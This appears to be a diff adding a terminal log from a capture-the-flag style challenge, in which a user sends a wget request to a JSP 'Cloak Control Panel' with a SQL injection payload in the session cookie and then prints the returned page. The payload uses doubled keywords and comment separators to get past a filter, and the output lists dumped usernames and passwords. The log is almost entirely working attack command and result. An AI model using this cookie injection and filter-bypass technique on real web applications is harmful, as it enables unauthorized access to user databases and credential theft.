@@ -1,0 +1,64 @@
+dhiru@ultra:~$ http_proxy=127.0.0.1:8080 wget --no-cookies --header 'Cookie: JSESSIONID=6C0AC368523213E0B0B6758DAB1484B6; userid=71934/**/unUNIONion/**/seSELECTlect/**/*/**/from/**/users; sessionid=0' http://cloaknet.csc.kth.se:8080/proxypanel.jsp
+--2015-11-29 00:44:01--  http://cloaknet.csc.kth.se:8080/proxypanel.jsp
+Connecting to 127.0.0.1:8080... connected.
+Proxy request sent, awaiting response... 200 OK
+Length: 1258 (1,2K) [text/html]
+Saving to: ‘proxypanel.jsp’
+
+proxypanel.jsp                    100%[=============================================================>]   1,23K  --.-KB/s   in 0s
+
+2015-11-29 00:44:01 (93,7 MB/s) - ‘proxypanel.jsp’ saved [1258/1258]
+
+dhiru@ultra:~$ cat proxypanel.jsp
+
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "DTD/xhtml1-transitional.dtd">
+<html>
+<head>
+
+
+<title>Cloak Control Panel</title>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<link rel="stylesheet" type="text/css" href="cloaknet.css" />
+</head>
+
+<body>
+<div id="wrapper">
+<div id="header">
+<a href="index.jsp"><img src="/logo.png" alt="Thursday" class="logo3" width="468" height="60" /> </a>
+</div>
+
+<div id="quote">
+
+<p class="floatmid alignmid">
+<br><br>
+The premier cloaking solution for discrete users.
+</p>
+</div>
+<center>
+<div id="mainmid">
+<a href="/logout.jsp">Logout</a>
+<br><br><br>Welcome demo<table id='hor-minimalist-b' summary='Employee Pay Sheet'>
+<thead>
+<tr>
+<th scope='col'>Source</th>
+<th scope='col'>Target</th>
+<th scope='col'>Date</th>
+</tr>
+</thead>
+<tbody>
+<tr><td> 137.40.29.72</a></td><td> wraithmail:8080</a></td><td> 13/7/01</a></td></tr>
+<tr><td> blu</a></td><td> rosebud</a></td><td> 72133</a></td></tr>
+<tr><td> thursday</a></td><td> hydrazine</a></td><td> 13134</a></td></tr>
+<tr><td> demo</a></td><td> demo</a></td><td> 71934</a></td></tr>
+</tbody></table>
+
+
+
+
+
+</center>
+</div>
+<div id="footer">Copyright 1999-2011 Discrete Industries Ltd and related entities </div>
+</body>
+</html>
+dhiru@ultra:~$
